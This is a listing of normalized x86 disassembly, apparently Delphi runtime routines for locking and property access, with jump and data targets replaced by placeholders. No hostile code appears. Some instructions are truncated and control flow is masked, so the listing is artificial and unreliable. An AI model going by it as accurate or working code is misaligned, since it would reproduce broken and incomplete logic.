push ebp
push sub_3a75f49
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ esi ]
call sub_3a66414
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a75f50
push rw-data
call LeaveCriticalSection
retn
mov eax [ esi ]
mov eax [ eax + ebx * 4 ]
cmp eax [ rw-data ]
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
call sub_3a64380
sub_3a75f60
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov edx esp
movzx eax [ esi ]
call sub_3a7618c
test al al
je r-xdata
mov eax ebx
call sub_3a7610c
movzx eax [ ebx + 0x4 ]
push eax
mov ecx esi
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_3a75f98
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
cmp di [ ebx + 0x4 ]
je r-xdata
mov eax ebx
call sub_3a7610c
lea edx [ ebp - 0x8 ]
movzx eax [ esi ]
call sub_3a7618c
test al al
je r-xdata
push edi
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_3a75fec
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
lea eax [ ebp - 0x1 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
movzx eax [ ebp - 0x1 ]
mov edx [ ebp + 0x8 ]
lea edx [ edx + edx * 2 ]
add edx rw-data
movzx eax [ edx + eax - 0x2a ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_3a76024
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0xc ]
test al al
je r-xdata
mov eax ebx
call sub_3a7610c
movzx eax [ esp ]
push eax
mov ecx esi
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_3a76060
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_3a6478c
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_3a760c3
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x4 ]
test ax ax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a760ca
push rw-data
call LeaveCriticalSection
retn
movzx eax ax
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov [ edx + eax * 4 - 0x400 ] ecx
sub_3a76164
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_3a64434
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_3a7618c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp bx 0x100
jb r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp bx 0x7ff
jbe r-xdata
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_3a76234
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_3a66414
movzx edi bx
mov edx edi
sub edx 0x100
cmp eax edx
setg [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
mov eax [ rw-data ]
mov eax [ eax + edi * 4 - 0x400 ]
mov [ esi ] eax
cmp [ esi ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi ]
cmp eax [ rw-data ]
jne r-xdata
mov [ ebp - 0x1 ] al
mov al 0x1
sub_3a76248
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3a7631e
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_3a76301
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_3a6641c
mov esi eax
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a76308
push rw-data
call LeaveCriticalSection
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp ebx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x110 ]
mov eax [ ebx ]
call sub_3a64260
lea edx [ ebp - 0x110 ]
lea eax [ ebp - 0x10 ]
call sub_3a65504
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
call sub_3a69490
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] ebx
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
sub_3a76348
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_3a763b7
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a763be
retn
call sub_3a75ee8
push rw-data
call DeleteCriticalSection
mov eax rw-data
call sub_3a70c6c
mov eax rw-data
call sub_3a652a0
mov eax rw-data
mov ecx 0x15
mov edx [ r-xdata ]
call sub_3a65e38
mov eax rw-data
mov edx [ r-xdata ]
call sub_3a665dc
sub_3a76540
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_3a765fd
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ esi ] 0x1
jne r-xdata
mov eax esi
call sub_3a76534
mov eax [ eax + 0x9 ]
mov eax [ eax ]
call sub_3a76534
cmp esi [ r-xdata ]
je r-xdata
mov edx edi
mov eax ebx
call sub_3a6986c
jmp r-xdata
mov eax edi
test ebx ebx
setne dl
and edx 0x7f
mov edx [ edx * 4 + rw-data ]
call sub_3a652f4
mov eax [ rw-data ]
mov eax [ eax ]
mov edx r-xdata
call sub_3a69490
test al al
je r-xdata
cmp [ eax + 0x1 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a76604
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
lea edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_3a69270
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_3a652f4
jmp r-xdata
lea esi [ eax + 0xd ]
test ebx ebx
je r-xdata
mov eax edi
mov edx esi
call sub_3a65504
movzx eax [ esi ]
inc eax
add esi eax
dec ebx
test ebx ebx
jne r-xdata
sub_3a76618
push ebx
push esi
push edi
test edx edx
je r-xdata
or eax 0xffffffff
xor ecx ecx
mov cl [ eax + 0x1 ]
mov eax [ eax + ecx + 0xb ]
mov eax [ eax ]
mov cl [ eax + 0x1 ]
lea esi [ eax + ecx + 0xf ]
mov edi [ eax + ecx + 0x7 ]
xor eax eax
inc eax
lea esi [ ecx + esi + 0x1 ]
cmp eax edi
jle r-xdata
mov bl [ ecx + edx - 0x1 ]
xor bl [ ecx + esi ]
test bl 0xdf
jne r-xdata
mov cl [ esi ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
mov cl [ esi ]
dec ecx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_3a76664
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x1
jne r-xdata
mov eax ebx
call sub_3a76534
cmp [ eax + 0x1 ] 0x0
jge r-xdata
mov eax esi
call sub_3a699d8
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_3a76618
mov edx [ rw-data ]
mov eax esi
call sub_3a69490
test al al
je r-xdata
mov edx [ rw-data ]
mov eax esi
call sub_3a69490
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
call sub_3a699d8
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebx
retn
sub_3a766c8
push ebx
push esi
push edi
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx edx
or edx edx
je r-xdata
xor ebx ebx
mov bl [ eax + 0x1 ]
lea esi [ eax + ebx + 0x2 ]
mov bl [ esi + 0xa ]
movzx edi [ esi + ebx + 0xb ]
test edi edi
je r-xdata
mov cl [ edx - 0x4 ]
mov ch [ edx ]
and ecx 0xdfff
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea eax [ esi + ebx + 0xd ]
mov eax [ eax ]
jmp r-xdata
mov bh 0x0
mov bh 0x0
dec edi
lea eax [ eax + ebx + 0x1b ]
jne r-xdata
mov ch [ edx ]
and ch 0xdf
mov bl [ eax + 0x1a ]
jmp r-xdata
dec ebx
jne r-xdata
mov bx [ eax + 0x1a ]
and bh 0xdf
cmp ebx ecx
je r-xdata
mov ch [ ebx + edx - 0x1 ]
xor ch [ eax + ebx + 0x1a ]
test ch 0xdf
jne r-xdata
sub_3a76738
push ebx
push esi
push edi
xor ecx ecx
mov esi eax
mov cl [ eax + 0x1 ]
mov edi edx
xor eax eax
movzx ecx [ esi + ecx + 0xa ]
[ edi ]
mov esi [ esi + 0x4 ]
xor ecx ecx
test esi esi
je r-xdata
lea edi [ esi + ecx + 0xd ]
pop edi
pop esi
pop ebx
retn
mov esi [ esi ]
jmp r-xdata
lea edi [ edi + ecx + 0x1b ]
dec eax
jne r-xdata
mov [ edx + ebx * 4 ] edi
mov cl [ esi + 0x1 ]
lea esi [ esi + ecx + 0x2 ]
mov cl [ esi + 0xa ]
movzx eax [ esi + ecx + 0xb ]
test eax eax
je r-xdata
movzx ebx [ edi + 0x18 ]
mov cl [ edi + 0x1a ]
cmp [ edx + ebx * 4 ] 0x0
jne r-xdata
sub_3a7678c
mov ecx [ edx + 0xc ]
test ecx 0xffffff00
je r-xdata
mov al cl
retn
cmp [ edx + 0xf ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
call ecx
retn
ja r-xdata
and ecx 0xffffff
mov cl [ ecx + eax ]
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
retn
sub_3a767bc
push ebx
push edi
mov edi [ edx ]
mov edi [ edi ]
mov bl 0x4
cmp [ edi ] 0x7
je r-xdata
mov ecx [ edx + 0x4 ]
cmp [ edx + 0x7 ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
mov bl [ edi + ecx + 0x2 ]
call ecx
jmp r-xdata
ja r-xdata
cmp bl 0x4
jae r-xdata
and ecx 0xffffff
add ecx eax
mov al [ ecx ]
cmp bl 0x2
jb r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop edi
pop ebx
retn
cmp bl 0x2
jae r-xdata
mov ax [ ecx ]
cmp bl 0x4
jb r-xdata
movsx eax ax
je r-xdata
cmp bl 0x0
movsx eax al
je r-xdata
mov eax [ ecx ]
and eax 0xffff
and eax 0xff
pop edi
pop ebx
retn
sub_3a76830
push ebx
push esi
push edi
mov edi edx
mov esi [ edi ]
mov esi [ esi ]
mov bl 0x4
cmp [ esi ] 0x7
je r-xdata
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
xor ebx ebx
mov bl [ esi + 0x1 ]
mov bl [ esi + ebx + 0x2 ]
mov esi [ edi + 0x8 ]
cmp [ edi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add eax esi
mov [ eax ] cl
cmp bl 0x2
jb r-xdata
jb r-xdata
pop edi
pop esi
pop ebx
retn
mov [ eax ] cx
cmp bl 0x4
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
mov [ eax ] ecx
sub_3a7688c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_3a76900
push [ fs : eax ]
mov [ fs : eax ] esp
movzx eax [ ebx ]
dec al
je r-xdata
mov edx edi
mov eax esi
call sub_3a6986c
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a76907
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_3a6986c
mov ecx [ ebp - 0x4 ]
mov eax edi
mov edx r-xdata
call sub_3a655b8
jmp r-xdata
sub al 0x7
je r-xdata
jmp r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_3a76540
sub_3a7691c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_3a769ab
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_3a76534
mov esi [ eax + 0x1 ]
movzx eax [ ebx ]
dec al
je r-xdata
mov eax edi
call sub_3a699d8
mov ebx eax
sub ebx esi
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a769b2
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
mov ebx edi
test ebx ebx
je r-xdata
sub al 0x7
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x2
mov eax edi
call sub_3a65798
mov eax [ ebp - 0x4 ]
call sub_3a699d8
mov ebx eax
sub ebx esi
jmp r-xdata
sub ebx 0x4
mov ebx [ ebx ]
jmp r-xdata
mov edx edi
mov eax ebx
call sub_3a76664
mov ebx eax
sub_3a769bc
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add esi eax
mov edi ecx
xor ecx ecx
mov cl [ esi ]
inc ecx
[ edi ] [ esi ]
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x4
sub_3a76a00
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add edi eax
mov eax [ esi ]
mov eax [ eax ]
mov esi ecx
xor ecx ecx
mov cl [ eax + 0x1 ]
mov cl [ eax + ecx + 0x2 ]
lodsb [ esi ]
cmp al cl
jb r-xdata
jb r-xdata
stosb [ edi ]
mov cl al
[ edi ] [ esi ]
pop edi
pop esi
retn
mov al cl
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_3a76a7c
push ebx
push esi
push edi
add esp 0xffffff00
mov edi ecx
mov esi edx
mov ebx eax
mov eax esp
mov edx edi
mov ecx 0xff
call sub_3a6553c
mov ecx esp
mov edx esi
mov eax ebx
call sub_3a76a00
add esp 0x100
pop edi
pop esi
pop ebx
retn
sub_3a76ac4
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
mov edx [ esi + eax ]
mov eax ecx
call sub_3a76ab0
pop edi
pop esi
retn
jb r-xdata
call esi
pop edi
pop esi
retn
movsx esi si
add esi [ eax ]
call [ esi ]
pop edi
pop esi
retn
sub_3a76b04
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_3a76ab0
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_3a76b44
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_3a76b8c
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_3a76c64
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_3a65528
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a76b93
lea eax [ ebp - 0x4 ]
call sub_3a65a7c
retn
sub_3a76b9c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_3a76be4
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_3a65bdc
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_3a76d4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a76beb
lea eax [ ebp - 0x4 ]
call sub_3a65a7c
retn
sub_3a76bf4
push ebx
mov ebx ecx
mov ecx [ edx ]
mov ecx [ ecx ]
movzx ecx [ ecx ]
sub cl 0x5
je r-xdata
mov ecx ebx
call sub_3a76a54
pop ebx
retn
sub cl 0x5
je r-xdata
mov ecx ebx
call sub_3a76ac4
pop ebx
retn
dec cl
je r-xdata
mov ecx ebx
call sub_3a76b44
pop ebx
retn
jmp r-xdata
mov eax ebx
call sub_3a652a0
pop ebx
retn
sub_3a76c34
push ebx
mov ebx [ edx ]
mov ebx [ ebx ]
movzx ebx [ ebx ]
sub bl 0x5
je r-xdata
call sub_3a76a7c
pop ebx
retn
sub bl 0x5
je r-xdata
call sub_3a76b04
pop ebx
retn
dec bl
je r-xdata
call sub_3a76b9c
jmp r-xdata
pop ebx
retn
sub_3a76c64
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_3a76d3d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
movzx eax [ eax ]
sub al 0x5
je r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_3a76bf4
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_3a65bdc
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a76d44
lea eax [ ebp - 0x10 ]
call sub_3a652a0
retn
dec al
je r-xdata
mov eax [ ebx + 0x4 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax [ ebp - 0x4 ]
mov edx [ ebx ]
call sub_3a65ab8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a65a7c
mov [ ebp - 0xc ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ ebp - 0x8 ]
call [ ebp - 0xc ]
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call [ ebp - 0xc ]
jmp r-xdata
mov [ ebp - 0x8 ] esi
mov esi [ ebx + 0x10 ]
cmp esi 0x80000000
jne r-xdata
sub_3a76d4c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_3a76e13
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
movzx eax [ eax ]
sub al 0x5
je r-xdata
lea eax [ ebp - 0xc ]
mov edx edi
call sub_3a65528
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_3a76c34
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a76e1a
lea eax [ ebp - 0xc ]
call sub_3a652a0
retn
dec al
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax ebx
mov edx edi
call sub_3a65ab8
jmp r-xdata
mov [ ebp - 0x8 ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx edi
mov edx eax
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_3a76e24
push ebx
push esi
add esp 0xffffffec
mov ebx edx
mov edx [ ebx + 0x4 ]
mov ecx edx
and ecx 0xff000000
cmp ecx 0xff000000
jne r-xdata
cmp ecx 0xfe000000
jne r-xdata
mov esi edx
and esi 0xffffff
add esi eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_3a76534
movzx eax [ eax ]
cmp eax 0x4
ja r-xdata
mov [ esp + 0xc ] edx
mov ecx [ eax ]
movsx edx dx
add ecx edx
mov edx [ ecx ]
mov [ esp + 0xc ] edx
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] ax
jmp r-xdata
jmp [ eax * 4 + jump_table_3a76e64 ]
mov edx eax
mov eax [ esp + 0x10 ]
call [ esp + 0xc ]
fstp [ esp ]
fwait
mov eax [ esp + 0x10 ]
call [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov [ esp + 0x10 ] eax
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
fld [ esp ]
add esp 0x14
pop esi
pop ebx
retn
fld [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ esi ]
mov [ esp ] eax
mov eax [ esi + 0x4 ]
mov [ esp + 0x4 ] eax
mov ax [ esi + 0x8 ]
mov [ esp + 0x8 ] ax
jmp r-xdata
fild [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ esi ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
mov eax [ ebx ]
mov eax [ eax ]
call sub_3a76534
cmp [ eax ] 0x4
jne r-xdata
sub_3a76f3c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx [ esi + 0x8 ]
mov eax [ esi ]
mov eax [ eax ]
call sub_3a76534
movzx eax [ eax ]
mov edx ebx
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
cmp edx 0xfe000000
jne r-xdata
mov edx ebx
and edx 0xffffff
add edx edi
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x8 ] ebx
mov edx [ edi ]
movsx ecx bx
add edx ecx
mov edx [ edx ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
jmp [ eax * 4 + jump_table_3a76f85 ]
and eax 0x7f
cmp eax 0x4
ja r-xdata
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x4 ] edi
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov ax [ ebp + 0x10 ]
mov [ edx + 0x8 ] ax
jmp r-xdata
fld [ ebp + 0x8 ]
fistp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
fistp [ edx ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_3a770b4 ]
jmp [ eax * 4 + jump_table_3a77021 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
movzx eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
movzx eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
sub_3a77148
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
lea edx [ esi + eax ]
mov eax ecx
call sub_3a77134
pop edi
pop esi
retn
jb r-xdata
call esi
pop edi
pop esi
retn
movsx esi si
add esi [ eax ]
call [ esi ]
pop edi
pop esi
retn
sub_3a77188
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_3a77134
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_3a771c8
push ebx
push esi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov ebx [ esi + 0x4 ]
cmp [ esi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and ebx 0xffffff
add eax ebx
mov edx [ eax ]
mov ebx [ eax + 0x4 ]
mov [ ecx ] edx
mov [ ecx + 0x4 ] ebx
pop esi
pop ebx
retn
jb r-xdata
call ebx
pop esi
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop esi
pop ebx
retn
sub_3a77208
push ebx
mov ebx [ edx + 0x8 ]
cmp [ edx + 0xb ] 0xfe
ja r-xdata
and ebx 0xffffff
add eax ebx
mov edx [ ecx ]
mov ebx [ ecx + 0x4 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
pop ebx
retn
mov edx [ edx + 0x10 ]
push [ ecx + 0x4 ]
push [ ecx ]
jb r-xdata
call ebx
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop ebx
retn
sub_3a77240
cmp [ edx + 0x7 ] 0xfe
mov ecx [ edx + 0x4 ]
mov edx [ edx + 0x10 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ eax + 0x4 ]
mov eax [ eax ]
retn
jb r-xdata
call ecx
retn
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
retn
sub_3a77268
push ebp
mov ebp esp
cmp [ edx + 0xb ] 0xfe
mov ecx [ edx + 0x8 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
